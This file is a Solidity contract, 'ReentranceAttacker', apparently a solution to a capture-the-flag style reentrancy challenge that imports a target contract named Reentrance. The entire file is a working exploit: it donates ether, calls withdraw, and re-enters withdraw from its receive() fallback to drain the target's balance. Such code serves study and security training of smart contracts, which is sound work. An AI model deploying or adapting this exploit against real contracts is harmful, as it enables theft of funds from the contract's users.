// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./target/Reentrance.sol";

contract ReentranceAttacker {
    Reentrance reentrace;

    constructor(address payable _reentrance) public {
        reentrace = Reentrance(_reentrance);
    }

    // attack
    function attack() public payable {
        reentrace.donate{value: msg.value}(address(this));
        reentrace.withdraw(msg.value);
    }

    // receive
    receive() external payable {
        reentrace.withdraw(msg.value);
    }
}
